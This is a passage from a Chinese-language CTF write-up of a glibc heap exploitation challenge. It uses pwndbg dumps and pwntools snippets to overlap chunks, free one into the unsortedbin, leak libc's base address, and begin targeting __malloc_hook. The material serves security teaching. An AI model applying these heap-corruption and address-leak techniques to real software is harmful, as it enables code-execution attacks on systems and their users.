<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757000</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757020</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757040</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757060</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: <span class="number">0x555555757080</span></span><br><span class="line">Size: <span class="number">0x00</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>此时的内存：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">50</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index0</span><br><span class="line"><span class="number">0x555555757010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index1</span><br><span class="line"><span class="number">0x555555757030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index2</span><br><span class="line"><span class="number">0x555555757050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index3</span><br><span class="line"><span class="number">0x555555757070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index4</span><br><span class="line"><span class="number">0x555555757090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">.....（省略内容均为空）</span><br><span class="line"><span class="number">0x555555757110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020ef1</span> #top_chunk</span><br><span class="line"><span class="number">0x555555757120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">.....（省略内容均为空）</span><br><span class="line"><span class="number">0x555555757180</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>此时的结构体状况：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5fcead98730</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000010</span></span><br><span class="line">    			#index0</span><br><span class="line"><span class="number">0x5fcead98740</span>:	<span class="number">0x0000555555757010</span>	<span class="number">0x0000000000000001</span></span><br><span class="line">    								#index1（chunk_flag改变）</span><br><span class="line"><span class="number">0x5fcead98750</span>:	<span class="number">0x0000000000000010</span>	<span class="number">0x0000555555757050</span></span><br><span class="line">                #chunk_content_size（改变）   #chunk_data_ptr（改变）</span><br><span class="line"><span class="number">0x5fcead98760</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000010</span></span><br><span class="line">     			#index2（chunk_flag改变）  #chunk_data_size（改变）</span><br><span class="line"><span class="number">0x5fcead98770</span>:	<span class="number">0x0000555555757090</span>	<span class="number">0x0000000000000001</span></span><br><span class="line">    			#chunk_data_ptr（改变）  #index3</span><br><span class="line"><span class="number">0x5fcead98780</span>:	<span class="number">0x0000000000000010</span>	<span class="number">0x0000555555757070</span></span><br><span class="line"><span class="number">0x5fcead98790</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000080</span></span><br><span class="line">    			#index4</span><br><span class="line"><span class="number">0x5fcead987a0</span>:	<span class="number">0x0000555555757090</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5fcead987b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p><strong>注意，此时我们有两个地方指向 index4：</strong></p>
<ul>
<li><strong>index4 的 content 指针（程序的正常指向）</strong></li>
<li><strong>index2 的 content 指针 （通过执行 payload 中 malloc 之后的指向，参照上方代码框中的结构体）</strong></li>
</ul>
<p><strong>第二个 malloc 得到的是 index 为 2 的 chunk，这与程序中的 Allocate 函数有关，可以回顾一下前面的 IDA 代码。</strong><br><strong>也就是说假如我们现在要 fill index2 的内容，那么其实上是修改 index4 的内容。</strong></p>
<h3 id="1-7、修改-index4-的-size-为-0x91"><a href="#1-7、修改-index4-的-size-为-0x91" class="headerlink" title="1-7、修改 index4 的 size 为 0x91"></a>1-7、修改 index4 的 size 为 0x91</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#为了让index4能够被放到unsortedbin中,要把它的大小改回来</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">50</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index0</span><br><span class="line"><span class="number">0x555555757010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index1</span><br><span class="line"><span class="number">0x555555757030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index2</span><br><span class="line"><span class="number">0x555555757050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index3</span><br><span class="line"><span class="number">0x555555757070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span> #index4</span><br><span class="line"><span class="number">0x555555757090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">.....（省略内容均为空）</span><br><span class="line"><span class="number">0x555555757110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020ef1</span> #top_chunk</span><br><span class="line"><span class="number">0x555555757120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">.....（省略内容均为空）</span><br><span class="line"><span class="number">0x555555757180</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>程序结构体未发生变化</p>
</blockquote>
<h3 id="1-8、申请新堆块–index5"><a href="#1-8、申请新堆块–index5" class="headerlink" title="1-8、申请新堆块–index5"></a>1-8、申请新堆块–index5</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#再申请一个堆块（index5）防止index4与top chunk合并了，具体原因见前面</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">50</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index0</span><br><span class="line"><span class="number">0x555555757010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index1</span><br><span class="line"><span class="number">0x555555757030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index2</span><br><span class="line"><span class="number">0x555555757050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index3</span><br><span class="line"><span class="number">0x555555757070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span> #index4</span><br><span class="line"><span class="number">0x555555757090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">.....（省略内容均为空）</span><br><span class="line"><span class="number">0x555555757110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span> #index5</span><br><span class="line">.....（省略内容均为空）</span><br><span class="line"><span class="number">0x5555557571a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020e61</span> #top_chunk</span><br><span class="line">.....（省略内容均为空）</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>此时程序结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5fcead98730</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000010</span></span><br><span class="line">    			#index0</span><br><span class="line"><span class="number">0x5fcead98740</span>:	<span class="number">0x0000555555757010</span>	<span class="number">0x0000000000000001</span></span><br><span class="line">    								#index1</span><br><span class="line"><span class="number">0x5fcead98750</span>:	<span class="number">0x0000000000000010</span>	<span class="number">0x0000555555757050</span></span><br><span class="line"><span class="number">0x5fcead98760</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000010</span></span><br><span class="line">     			#index2</span><br><span class="line"><span class="number">0x5fcead98770</span>:	<span class="number">0x0000555555757090</span>	<span class="number">0x0000000000000001</span></span><br><span class="line">    							    #index3</span><br><span class="line"><span class="number">0x5fcead98780</span>:	<span class="number">0x0000000000000010</span>	<span class="number">0x0000555555757070</span></span><br><span class="line"><span class="number">0x5fcead98790</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000080</span></span><br><span class="line">    			#index4</span><br><span class="line"><span class="number">0x5fcead987a0</span>:	<span class="number">0x0000555555757090</span>	<span class="number">0x0000000000000001</span></span><br><span class="line">    								#index5（此处发生了改变）</span><br><span class="line"><span class="number">0x5fcead987b0</span>:	<span class="number">0x0000000000000080</span>	<span class="number">0x0000555555757120</span></span><br><span class="line">    			#（此处发生了改变）     #（此处发生了改变）</span><br></pre></td></tr></table></figure>

<h3 id="1-9、free-index4-，将-index4-放入-unsortedbin-中"><a href="#1-9、free-index4-，将-index4-放入-unsortedbin-中" class="headerlink" title="1-9、free(index4)，将 index4 放入 unsortedbin 中"></a>1-9、free(index4)，将 index4 放入 unsortedbin 中</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#这时候<span class="built_in">free</span>就会把index4放到unsorted中了</span><br><span class="line"><span class="built_in">free</span>(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line">FD: <span class="number">0x555555757080</span> ◂— <span class="number">0x0</span></span><br><span class="line">BK: <span class="number">0x555555757080</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x555555757080</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757000</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757020</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757040</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757060</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(unsortedbin)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x555555757080</span></span><br><span class="line"><span class="function">Size: 0x91</span></span><br><span class="line"><span class="function">fd: 0x00</span></span><br><span class="line"><span class="function">bk: 0x7ffff7dd1b78</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Allocated chunk</span></span><br><span class="line"><span class="function">Addr: 0x555555757110</span></span><br><span class="line"><span class="function">Size: 0x90</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Top chunk | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x5555557571a0</span></span><br><span class="line"><span class="function">Size: 0x20e61</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">pwndbg&gt; x/16gx &amp;main_arena</span></span><br><span class="line"><span class="function">0x7ffff7dd1b20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x7ffff7dd1b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x7ffff7dd1b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x7ffff7dd1b50 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x7ffff7dd1b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x7ffff7dd1b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x00005555557571a0 #top_chunk</span></span><br><span class="line"><span class="function">0x7ffff7dd1b80 &lt;main_arena+96&gt;:	0x0000000000000000	0x0000555555757080 <span class="meta">#unsortedbin</span></span></span><br><span class="line"><span class="function">0x7ffff7dd1b90 &lt;main_arena+112&gt;:	0x0000555555757080	0x00007ffff7dd1b88</span></span><br><span class="line"><span class="function">pwndbg&gt; x/60gx 0x555555757000</span></span><br><span class="line"><span class="function">0x555555757000:	0x0000000000000000	0x0000000000000021 #index0</span></span><br><span class="line"><span class="function">0x555555757010:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x555555757020:	0x0000000000000000	0x0000000000000021 #index1</span></span><br><span class="line"><span class="function">0x555555757030:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x555555757040:	0x0000000000000000	0x0000000000000021 #index2</span></span><br><span class="line"><span class="function">0x555555757050:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x555555757060:	0x0000000000000000	0x0000000000000021 #index3</span></span><br><span class="line"><span class="function">0x555555757070:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x555555757080:	0x0000000000000000	0x0000000000000091 #index4（unsortedbin）</span></span><br><span class="line"><span class="function">0x555555757090:	0x00007ffff7dd1b78	0x00007ffff7dd1b78</span></span><br><span class="line"><span class="function">.....（省略内容均为空）</span></span><br><span class="line"><span class="function">0x555555757110:	0x0000000000000000	0x0000000000000090 #index5</span></span><br><span class="line"><span class="function">.....（省略内容均为空）</span></span><br><span class="line"><span class="function">0x5555557571a0:	0x0000000000000000	0x0000000000020e61 #top_chunk</span></span><br><span class="line"><span class="function">.....（省略内容均为空）</span></span><br><span class="line"><span class="function">0x5555557571d0:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">pwndbg&gt;</span></span><br></pre></td></tr></table></figure>

<p>当 unsortedbin 里只有一个空闲的 chunk 时，该 chunk 的 fd 和 bk 指针均指向 unsortedbin 本身，这个可以参考 CTF-wiki 中的内容，这里先不细说。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5fcead98730</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000010</span></span><br><span class="line">    			#index0</span><br><span class="line"><span class="number">0x5fcead98740</span>:	<span class="number">0x0000555555757010</span>	<span class="number">0x0000000000000001</span></span><br><span class="line">    								#index1</span><br><span class="line"><span class="number">0x5fcead98750</span>:	<span class="number">0x0000000000000010</span>	<span class="number">0x0000555555757050</span></span><br><span class="line"><span class="number">0x5fcead98760</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000010</span></span><br><span class="line">     			#index2</span><br><span class="line"><span class="number">0x5fcead98770</span>:	<span class="number">0x0000555555757090</span>	<span class="number">0x0000000000000001</span></span><br><span class="line">    							    #index3</span><br><span class="line"><span class="number">0x5fcead98780</span>:	<span class="number">0x0000000000000010</span>	<span class="number">0x0000555555757070</span></span><br><span class="line"><span class="number">0x5fcead98790</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    			#index4（此处发生了改变）#（此处发生了改变）</span><br><span class="line"><span class="number">0x5fcead987a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000001</span></span><br><span class="line">    			#（此处发生了改变）	   #index5</span><br><span class="line"><span class="number">0x5fcead987b0</span>:	<span class="number">0x0000000000000080</span>	<span class="number">0x0000555555757120</span></span><br></pre></td></tr></table></figure>

<h3 id="1-10、计算-libc-基址"><a href="#1-10、计算-libc-基址" class="headerlink" title="1-10、计算 libc 基址"></a>1-10、计算 libc 基址</h3><p>这时查看我们的内存分布：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1604659813767-e4f0e97b-0f5e-4c25-afbb-cfe0581d42cd.png#align=left&display=inline&height=760&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-11-06%2018.50.11.png&originHeight=760&originWidth=1920&size=187173&status=done&style=none&width=1920" alt="截屏2020-11-06 18.50.11.png"></p>
<blockquote>
<p>注意：文章前面的结构体内存情况是我后来补充的，由于地址随机，故与上图的地址不相同。</p>
</blockquote>
<hr>
<blockquote>
<p>0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so</p>
</blockquote>
<p>上面这一行中的 0x7ffff7a0d000 就是 libc 的基地址。<br><strong>libc 基址与 unsortedbin 本身的地址的 offset 是不变的</strong>。为：<img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1604668034156-df0186c8-f2d3-4896-bc54-0072b8a78fb1.png#align=left&display=inline&height=112&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-11-06%2021.07.07.png&originHeight=112&originWidth=784&size=17224&status=done&style=none&width=784" alt="截屏2020-11-06 21.07.07.png"><br>3951480（十进制）==0x3C4B78<br>除了上面 payload 外，还可以直接这样写：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">还可以直接这样写</span><br><span class="line">libc_base = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">示例payload的写法：</span><br><span class="line">#因为index2是指向index4的，所以直接把index2给dump一下就能拿到index4中前一部分的内容了</span><br><span class="line">#main_arena与libc偏移为<span class="number">0x3c4b20</span>(附件中有工具)</span><br><span class="line">#再加上main_arena与unsortedbin的偏移,得到unsortedbins与libc的偏移</span><br><span class="line">unsorted_offset_mainarena=unsorted_offset_arena(<span class="number">5</span>)#这函数还不太明白</span><br><span class="line">unsorted_addr=u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base=unsorted_addr<span class="number">-0x3c4b20</span>-unsorted_offset_mainarena</span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">&quot;libc_base: &quot;</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line">def unsorted_offset_arena(idx):</span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="meta"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="meta"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="meta"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="meta"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="meta"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="meta"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line">-----------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结构体状况未发生改变</p>
</blockquote>
<h2 id="2、控制-malloc-hook"><a href="#2、控制-malloc-hook" class="headerlink" title="2、控制__malloc_hook"></a>2、控制__malloc_hook</h2><h3 id="2-1、申请-unsortedbin-中的堆块"><a href="#2-1、申请-unsortedbin-中的堆块" class="headerlink" title="2-1、申请 unsortedbin 中的堆块"></a>2-1、申请 unsortedbin 中的堆块</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x60</span>)</span><br></pre></td></tr></table></figure>

<p>由于在申请空间之前，之后 unsortedbin 中有空闲的空间，因此申请空间之后会使用 unsortedbin 中的 chunk。<br>看一下此时的堆内存：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">60</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index0</span><br><span class="line"><span class="number">0x555555757010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index1</span><br><span class="line"><span class="number">0x555555757030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index2</span><br><span class="line"><span class="number">0x555555757050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index3</span><br><span class="line"><span class="number">0x555555757070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757080</span>:	<span 